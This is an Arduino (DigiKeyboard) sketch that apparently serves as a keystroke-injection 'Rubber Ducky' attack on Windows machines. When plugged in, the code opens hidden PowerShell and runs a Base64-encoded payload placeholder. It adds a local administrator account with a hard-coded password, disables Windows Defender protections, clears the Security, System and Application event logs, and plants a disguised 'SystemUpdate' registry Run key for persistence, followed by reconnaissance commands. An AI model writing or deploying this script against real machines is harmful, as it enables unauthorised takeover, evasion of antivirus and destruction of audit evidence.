#include "DigiKeyboard.h"

void pressWinR() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
}

void typeAndRun(const char* command) {
  DigiKeyboard.print(command);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void openPowerShellHidden() {
  pressWinR();
  typeAndRun("powershell -WindowStyle Hidden");
}

void executeEncodedPayload() {
  DigiKeyboard.print("powershell -EncodedCommand ");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("<Base64Payload>");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void addNewAdminUser() {
  typeAndRun("net user pentester StrongPass123 /add");
  typeAndRun("net localgroup administrators pentester /add");
}

void disableDefender() {
  typeAndRun("powershell Set-MpPreference -DisableRealtimeMonitoring $true");
  typeAndRun("powershell Set-MpPreference -DisableIOAVProtection $true");
  typeAndRun("powershell Set-MpPreference -DisableScriptScanning $true");
}

void clearEventLogs() {
  typeAndRun("wevtutil cl Application");
  typeAndRun("wevtutil cl Security");
  typeAndRun("wevtutil cl System");
}

void persistInStartup() {
  typeAndRun("powershell New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' -Value 'powershell -w hidden -EncodedCommand <Base64Payload>'");
}

void testInternetConnectivity() {
  typeAndRun("ping -n 2 8.8.8.8");
  typeAndRun("powershell Test-Connection -ComputerName google.com -Count 2");
}

void openNotepadTest() {
  pressWinR();
  typeAndRun("notepad");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("[+] Test successful: Payload reached this point\n");
}

void echoTests() {
  typeAndRun("echo [+] Beginning staged payload execution...");
  typeAndRun("echo [+] Checking environment...");
  typeAndRun("whoami");
  typeAndRun("hostname");
  typeAndRun("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"");
}

void runReconCommands() {
  typeAndRun("ipconfig /all");
  typeAndRun("netstat -ano");
  typeAndRun("tasklist");
  typeAndRun("net user");
  typeAndRun("net localgroup administrators");
}

void createTempFiles() {
  typeAndRun("echo Hello > %TEMP%\\testfile.txt");
  typeAndRun("copy %TEMP%\\testfile.txt %TEMP%\\testfile_copy.txt");
  typeAndRun("del %TEMP%\\testfile.txt");
}

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  openPowerShellHidden();
  executeEncodedPayload();
  DigiKeyboard.delay(500);

  addNewAdminUser();
  disableDefender();
  clearEventLogs();
  persistInStartup();
  DigiKeyboard.delay(500);

  echoTests();
  runReconCommands();
  createTempFiles();
  testInternetConnectivity();
  openNotepadTest();

  DigiKeyboard.print("[+] Rubber Ducky script execution completed\n");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
